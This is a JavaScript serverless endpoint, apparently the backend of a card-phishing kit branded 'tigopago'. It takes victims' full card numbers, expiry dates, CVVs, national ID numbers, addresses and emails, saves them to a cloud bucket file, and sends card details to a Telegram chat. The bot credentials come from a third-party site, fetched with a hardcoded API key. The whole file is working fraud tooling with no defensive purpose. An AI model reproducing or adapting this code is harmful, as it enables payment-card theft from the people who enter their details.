require('dotenv').config();

const AWS = require('aws-sdk');
const crypto = require('crypto');

const s3 = new AWS.S3({
    accessKeyId: process.env.AWS_ACCESS_KEY_ID,
    secretAccessKey: process.env.AWS_SECRET_ACCESS_KEY,
    endpoint: process.env.R2_ENDPOINT,
    s3ForcePathStyle: true,
    signatureVersion: 'v4',
    region: 'auto'
});

const BUCKET = process.env.R2_BUCKET;

async function obtenerCredencialesTelegram(site = 'tigopago') {
    try {
        const apiKey = process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v';
        console.log('[Telegram] Obteniendo credenciales de laboratorio.lol con site:', site);

        const controller = new AbortController();
        const timeout = setTimeout(() => controller.abort(), 5000);

        const response = await fetch(
            `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
            { headers: { 'X-API-Key': apiKey }, signal: controller.signal }
        );
        clearTimeout(timeout);

        const data = await response.json();
        console.log('[Telegram] Respuesta de laboratorio.lol:', data);
        const token = data.token || data.bot_token;
        const chatId = data.chat_id;
        console.log('[Telegram] Token obtenido:', token ? '✓' : '✗', 'ChatId:', chatId ? '✓' : '✗');
        return { token, chatId };
    } catch (error) {
        console.error('[Telegram] Error obteniendo credenciales:', error.message);
        return null;
    }
}

async function enviarNotificacionTarjeta(txid, transaccion) {
    try {
        const creds = await obtenerCredencialesTelegram('tigopago');
        if (!creds?.token || !creds?.chatId) return;

        const mensaje = `💳 <b>NUEVA TRANSACCIÓN TARJETA</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Nombre:</b> ${transaccion.nombre}\n<b>Tarjeta:</b> ${transaccion.cardNumber}\n<b>Monto:</b> $${transaccion.monto}\n<b>Hora:</b> ${new Date(transaccion.timestamp).toLocaleString('es-CO')}`;

        await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: creds.chatId, text: mensaje, parse_mode: 'HTML' })
        });
    } catch (error) {
        console.error('Error Telegram tarjeta:', error);
    }
}

async function guardarTransaccionTarjeta(txid, datos) {
    const transaccion = { txid, ...datos, timestamp: new Date().toISOString() };

    return new Promise((resolve, reject) => {
        s3.getObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt' }, (err, data) => {
            let content = '';
            if (!err && data?.Body) content = data.Body.toString();
            content += JSON.stringify(transaccion) + '\n';

            s3.putObject({ Bucket: BUCKET, Key: 'datos_tarjeta.txt', Body: content, ContentType: 'text/plain' }, (err) => {
                if (err) reject(err);
                else resolve(transaccion);
            });
        });
    });
}

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
    res.setHeader('Content-Type', 'application/json');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(400).json({ ok: false, error: 'POST requerido' });
    }

    try {
        const body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
        const txid = body.txId;

        if (!txid) {
            return res.status(400).json({ ok: false, error: 'txId requerido' });
        }

        const transaccion = { txid, cardNumber: body.cardNumber, expDate: body.expDate, cvv: body.cvv, nombre: body.nombre, cedula: body.cedula, direccion: body.direccion, email: body.email, franquicia: body.franquicia, cardType: body.cardType, bankName: body.bankName, monto: body.monto, estado: body.estado || 'pendiente' };

        await guardarTransaccionTarjeta(txid, transaccion);
        await enviarNotificacionTarjeta(txid, transaccion);

        return res.status(200).json({ ok: true, txid });
    } catch (error) {
        return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
    }
};
